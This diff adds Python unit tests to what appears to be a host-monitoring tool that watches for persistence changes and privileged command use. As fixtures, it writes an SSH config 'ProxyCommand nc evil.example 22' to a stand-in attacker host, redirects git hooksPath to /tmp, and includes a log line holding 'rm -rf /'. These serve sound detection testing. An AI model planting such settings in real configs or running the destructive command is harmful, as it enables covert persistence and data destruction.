@@ -1107,6 +1107,80 @@ class AlertsTest(unittest.TestCase):
         self.assertTrue(self.got[0]["expected"])
         self.assertEqual(self.got[0]["severity"], "info")
 
+    def test_unreadable_targets_are_unavailable_not_deleted(self):
+        from hlidskjalv import alerts as A
+        home, root = self.dir / "home2", self.dir / "proj2"
+        home.mkdir(parents=True)
+        root.mkdir(parents=True)
+        t = A.Target("Some folder", "high", "why", home / "units", glob="*")
+        (home / "units").mkdir()
+        (home / "units" / "a.service").write_text("[Service]\n")
+        w = A.PersistenceWatcher(root, self.alerter, every_s=0, home=home)
+        w.targets, w.state = [t], {id(t): w._snap(t)}
+        real = Path.is_dir
+
+        def denied(path):
+            if path == home / "units":
+                raise PermissionError("denied")
+            return real(path)
+        with mock.patch.object(Path, "is_dir", denied):
+            self.assertIsNone(t.read())
+            w.poll()
+        self.assertEqual(self.got, [])  # not "a.service removed"
+        (home / "units" / "b.service").write_text("[Service]\n")
+        w.poll()
+        self.assertEqual([e["data"]["change"] for e in self.got], ["added"])
+        # A target that starts unreadable takes its first readable snapshot as the baseline.
+        self.got.clear()
+        u = A.Target("Late folder", "high", "why", home / "late", glob="*")
+        w.targets, w.state = [u], {id(u): None}
+        (home / "late").mkdir()
+        (home / "late" / "x").write_text("1")
+        w.poll()
+        self.assertEqual(self.got, [])
+
+    def test_ssh_client_and_project_git_settings(self):
+        from hlidskjalv.alerts import PersistenceWatcher
+        home, root = self.dir / "home3", self.dir / "proj3"
+        (home / ".ssh").mkdir(parents=True)
+        (root / ".git").mkdir(parents=True)
+        (home / ".ssh" / "config").write_text("Host gh\n  HostName github.com\n")
+        (root / ".git" / "config").write_text("[core]\n\tbare = false\n")
+        w = PersistenceWatcher(root, self.alerter, every_s=0, home=home)
+        (home / ".ssh" / "config").write_text("Host gh\n  HostName github.com\n  ProxyCommand nc evil.example 22\n")
+        (root / ".git" / "config").write_text("[core]\n\tbare = false\n\thooksPath = /tmp/x\n")
+        w.poll()
+        sev = {e["data"]["what"]: e["severity"] for e in self.got}
+        self.assertEqual(sev["SSH client settings"], "high")
+        self.assertEqual(sev["Git settings of this project"], "high")
+        self.got.clear()
+        (home / ".ssh" / "config").write_text("Host gh\n  HostName github.com\n  ProxyCommand nc evil.example 22\n  User git\n")
+        w.poll()
+        self.assertEqual(self.got[0]["severity"], "medium")  # a harmless option
+
+    def test_system_wide_targets_per_platform(self):
+        from hlidskjalv import alerts as A
+        for sysname, expected in (("linux", {"System scheduled jobs (/etc/cron.d)", "System services (/etc/systemd/system)",
+                                              "Login environment (environment.d)"}),
+                                  ("darwin", {"System daemons (launchd)", "Login agents for every user"}),
+                                  ("windows", {"Scheduled tasks", "Run keys for every user (registry)"})):
+            with mock.patch.object(A, "_system", lambda s=sysname: s):
+                labels = {t.label for t in A.persistence_targets(self.dir, self.dir)}
+            self.assertTrue(expected <= labels, (sysname, expected - labels))
+
+    def test_scheduled_tasks_keep_name_and_action_only(self):
+        from hlidskjalv.alerts import windows_tasks
+        out = ('"PC","\\Hlidskjalv","31/10/2026 08:00:00","Ready","Interactive","N/A","0","sam","C:\\py.exe -m hlidskjalv watch C:\\p"\r\n'
+               '"PC","\\Hlidskjalv","N/A","Ready","Interactive","N/A","0","sam","C:\\py.exe -m hlidskjalv watch C:\\p"\r\n'
+               '"PC","\\Updater","01/11/2026 03:00:00","Ready","Background","N/A","0","x","C:\\tmp\\u.exe"\r\n'
+               'garbage line\r\n')
+        tasks = windows_tasks(lambda: out)
+        self.assertEqual(tasks, {"schtasks:\\Hlidskjalv": b"C:\\py.exe -m hlidskjalv watch C:\\p",
+                                 "schtasks:\\Updater": b"C:\\tmp\\u.exe"})
+        later = out.replace("31/10/2026 08:00:00", "01/11/2026 08:00:00")  # next run time moved: not a change
+        self.assertEqual(windows_tasks(lambda: later), tasks)
+        self.assertEqual(windows_tasks(lambda: ""), {})
+
     def test_system_journal(self):
         from hlidskjalv.alerts import SystemLogWatcher
         lines = []
@@ -1386,6 +1460,28 @@ class ProgramsTest(unittest.TestCase):
             c.close()
         finally:
             httpd.shutdown(); httpd.server_close()
+
+
+class JournalRootToolsTest(unittest.TestCase):
+    def test_su_pkexec_and_doas(self):
+        from hlidskjalv.alerts import SystemLogWatcher
+        got = []
+
+        class FakeAlerter:
+            def raise_(self, severity, source, title, detail="", **kw):
+                got.append((severity, title))
+
+            def enabled(self, source):
+                return True
+        w = SystemLogWatcher.__new__(SystemLogWatcher)
+        w.alerter = FakeAlerter()
+        w.classify("su", "pam_unix(su:auth): authentication failure; logname=sam uid=1000 euid=0 tty=pts/2 ruser=sam rhost=  user=root")
+        w.classify("su", "(to root) sam on pts/2")
+        w.classify("su", "pam_unix(su:session): session closed for user root")
+        w.classify("pkexec", "sam: Executing command [USER=root] [TTY=unknown] [CWD=/home/sam] [COMMAND=/usr/bin/gparted]")
+        w.classify("doas", "command not permitted for sam: rm -rf /")
+        self.assertEqual(got, [("high", "su: failed attempt"), ("medium", "su used"), ("medium", "pkexec used"),
+                               ("high", "doas: failed attempt")])
 
 
 class CostAlertsTest(unittest.TestCase):
